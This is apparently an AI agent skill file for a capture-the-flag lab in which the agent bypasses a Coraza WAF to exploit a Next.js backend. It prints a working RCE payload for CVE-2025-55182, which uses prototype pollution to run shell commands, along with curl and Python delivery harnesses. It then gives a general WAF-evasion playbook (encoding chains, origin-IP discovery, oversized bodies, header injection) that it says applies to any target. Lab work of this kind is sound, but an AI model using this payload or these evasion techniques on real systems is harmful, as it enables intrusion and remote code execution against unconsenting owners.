---
name: waf-bypass-hunter
description: Bypass a Coraza WAF protecting a vulnerable Next.js 16 backend. Analyze parser differentials between Go (WAF) and Node.js (backend) to find bypasses.
license: MIT (lifted from HacktronAI/skills 78596bb9 :: waf-bypass-hunter/SKILL.md)
compatibility: Environment running on localhost:8009 (executor), localhost:9091 (WAF)
metadata:
  author: hacktron
  version: "1.0.0"
  category: security
  difficulty: hard
allowed-tools: Bash(*) Read Write
---

# WAF Bypass Hunter

## Objective

Bypass the WAF to execute the CVE-2025-55182 exploit payload and capture the flag.

## Architecture

```
┌─────────┐    ┌─────────────┐    ┌─────────────────┐
│  Agent  │───▶│ Coraza WAF  │───▶│ Next.js 16.0.6  │
│         │    │ (Go)        │    │ (Node.js)       │
│         │    │ Port: 9091  │    │ Port: 3000      │
└─────────┘    └─────────────┘    └─────────────────┘
```

## The Exploit (CVE-2025-55182)

This payload triggers RCE in Next.js 16 via prototype pollution:

```http
POST / HTTP/1.1
Host: localhost:9091
Next-Action: x
Content-Type: multipart/form-data; boundary=yyy
Content-Length: 489

--yyy
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag.txt').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}
--yyy
Content-Disposition: form-data; name="1"

"$@0"
--yyy--
```

**This payload is BLOCKED by the WAF** because it contains:
- `:constructor`
- `__proto__`

## Your Goal

Find **as many WAF bypasses as possible**. There are approximately **5 different bypass techniques** that work.

For each bypass, deliver the payload such that:
1. **Bypasses WAF detection** - WAF doesn't see the blocked patterns
2. **Backend parses correctly** - Next.js/Busboy decodes and processes it
3. **Triggers the exploit** - RCE executes and returns the flag

Each bypass exploits a different parser differential between Go and Node.js.

## Testing Method

### Quick PoC Testing (Direct to WAF)

Use curl or Python directly against the WAF at `http://localhost:9091/`:

```bash
curl --path-as-is -i -s -k -X POST \
    -H 'Host: localhost' \
    -H 'Next-Action: x' \
    -H 'Content-Type: multipart/form-data; boundary=yyy' \
    --data-binary $'--yyy\r\nContent-Disposition: form-data; name="0"\r\n\r\nYOUR_PAYLOAD_HERE\r\n--yyy--' \
    'http://localhost:9091/'
```

```python
import requests

resp = requests.post(
    "http://localhost:9091/",
    headers={
        "Content-Type": "multipart/form-data; boundary=yyy",
        "Next-Action": "x"
    },
    data=payload
)
print(resp.status_code)
print(resp.headers.get("X-Action-Redirect"))  # Flag is here!
print(resp.text)
```

**Note:** The flag appears in the `X-Action-Redirect` response header, not the body!

### Debugging (Sandbox Executor)

Use the executor **only when you need WAF logs** to understand why a request was blocked:

```bash
curl -X POST http://localhost:8009/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "import requests\nresp = requests.post(\"http://localhost:9091/\", ...)\nprint(resp.status_code)"}'
```

**Response includes WAF logs:**
```json
{
  "stdout": "403",
  "stderr": "",
  "waf_logs": ["[BLOCKED] Rule 1008: Prototype Pollution detected"],
  "execution_time_ms": 123
}
```

## Example: Blocked Request

```python
import requests

payload = '''--yyy
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","_response":{"_formData":{"get":"$1:constructor:constructor"}}}
--yyy--'''

resp = requests.post(
    "http://waf:9090/",
    headers={
        "Content-Type": "multipart/form-data; boundary=yyy",
        "Next-Action": "x"
    },
    data=payload
)
print(resp.status_code)  # 403 - Blocked by WAF
print(resp.text)
```

## Available Source Code

Study parser implementations in `sources/`:

- `sources/coraza/internal/bodyprocessors/` - WAF's parser (Go)
- `sources/busboy/lib/` - Backend's parser (Node.js)
- `sources/nextjs/packages/next/src/server/` - Next.js server action handling


## Success Criteria

**IMPORTANT: A bypass is ONLY valid if the flag is successfully read.**

Hypothetical or theoretical bypasses do NOT count. You must:
1. Execute the payload against the WAF
2. Receive the flag in the response
3. Show the captured flag as proof

For each **confirmed** bypass:
- Document the technique used
- Show the exact working payload
- Show the captured flag

The flag may appear in:
- Response headers (e.g., `X-Action-Redirect`)
- Response body
- Error messages

The flag format is `HACKTRON{...}`

## WAF Rules (what you're bypassing)

```conf
# Block prototype pollution patterns
SecRule REQUEST_BODY|ARGS "@rx (?:__proto__|:constructor)" "id:1008,deny"

```

## Approach

1. Analyze source code in `sources/`
2. Identify where Go and Node.js parse differently
3. Craft payload that exploits the differential
4. Test PoC directly against WAF at `localhost:9091`
5. If blocked, use executor to get WAF logs and understand why
6. Iterate until flag is captured
7. If a technique doesn't work, **move on** - read more code, look for alternative differentials
8. **Keep hunting** - find more bypasses using different techniques!

## General WAF Bypass Methodology (Corpus-Derived)

These patterns apply to any WAF bypass scenario, not just the Coraza/Next.js CTF above.

### Phase 1: Fingerprint the WAF Rule Set

Before crafting bypasses, determine exactly what the WAF blocks and what it allows:

1. **Send a known-blocked payload** and record the response (status code, body, headers)
2. **Binary-search the trigger**: remove half the payload, resend. Which half triggers the block?
3. **Isolate the exact rule**: test each suspicious substring independently (`<script`, `onerror`, `SELECT`, `../`, `__proto__`)
4. **Test case sensitivity**: `<SCRIPT>`, `<ScRiPt>`, `<scrscriptipt>`
5. **Test encoding tolerance**: URL-encoded, double-encoded, Unicode (<), HTML entities (`&#x3c;`), mixed
6. **Document the rule map**: `{blocked_string} -> {rule_id/response}` for every triggered rule

### Phase 2: Parser Differential Exploitation

Every WAF bypass exploits a difference between how the WAF parses the request and how the backend parses it:

| Differential | WAF sees | Backend sees | Bypass |
|-------------|----------|-------------|--------|
| HTTP method override | `GET /path` | `X-HTTP-Method-Override: DELETE` honored | Method-restricted rules bypassed |
| Content-Type mismatch | `application/json` body rules | Backend parses as `form-urlencoded` when header is ambiguous | JSON rules do not fire on form payloads |
| Chunked encoding | Assembled body | Individual chunks (or vice versa) | Payload split across chunk boundaries |
| HTTP/2 pseudo-headers | Normalized path | Raw path with `%2f`, `//`, `/.` | Path-based rules bypassed |
| Multipart boundary | Strict boundary parsing | Lenient boundary parsing (extra whitespace, quotes) | Payload hidden in parser gap |
| Unicode normalization | Pre-normalization check | Post-normalization execution | `＜` normalizes to `<` after WAF check |

### Phase 3: Encoding Chain Bypass

Layer multiple encodings so the WAF sees an innocuous string but the backend decodes to the payload:

1. **Double URL encoding**: `%253C` -> WAF sees `%3C` -> backend decodes to `<`
2. **Mixed encoding**: URL-encode some chars, Unicode-escape others, HTML-entity the rest
3. **Overlong UTF-8**: `%C0%BC` is an overlong encoding of `<` that some parsers accept
4. **Base64 in parameter**: if backend auto-decodes Base64 values, encode the payload
5. **JSON Unicode escapes**: `<script>` in JSON bodies

### Phase 4: Structural Bypasses

Exploit how the WAF inspects the request structure:

1. **IP-based origin bypass**: if WAF is a cloud proxy, find the origin IP (via DNS history, certificate transparency, error pages) and connect directly
2. **Protocol downgrade**: WAF inspects HTTPS but backend also accepts HTTP on an alternate port
3. **Alternate entry points**: WAF protects `/api/*` but the same handler is reachable via `/internal/*`, `/v1/*`, or direct IP
4. **Request size overflow**: send a body larger than the WAF inspection buffer -- many WAFs skip inspection on oversized requests
5. **Slowloris/streaming**: WAF assembles the full request before inspection, but you can stream the payload to the backend before WAF decision completes (race condition)

### Phase 5: Filter-vs-Permission Inversion

UI-level filters are not security boundaries. When a frontend hides data:

1. **Capture the raw API response** -- does the backend return full data that the frontend filters client-side?
2. **Test the underlying API directly** -- frontend share/upload flows often have client-side filters the backend does not enforce
3. **For every UI-hidden field**: request it via API, GraphQL introspection, or parameter fuzzing

### Phase 6: Framework-Specific WAF Evasion

| Framework | Evasion Pattern |
|-----------|----------------|
| React/Angular SPA | XSS in framework event handlers (`ng-click`, `dangerouslySetInnerHTML`) bypasses string-matching WAF rules |
| WordPress | Plugin-specific parameters not covered by generic WAF rulesets |
| GraphQL | Alias queries, fragment injection, batch queries not inspected by REST-focused WAFs |
| gRPC | Binary protobuf bodies not inspected by HTTP-focused WAFs |
| WebSocket | Persistent connection frames not re-inspected after initial handshake |

### Deployment Artifact Audit

WAF rules do not protect misconfigured deployment:

1. Check ingress/reverse-proxy configs in public repos (`.github/`, `k8s/`, `terraform/`)
2. Test `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL` header injection to manipulate WAF path matching
3. Test Host header variations: `Host: internal.target.com` may route past the WAF to an unprotected backend

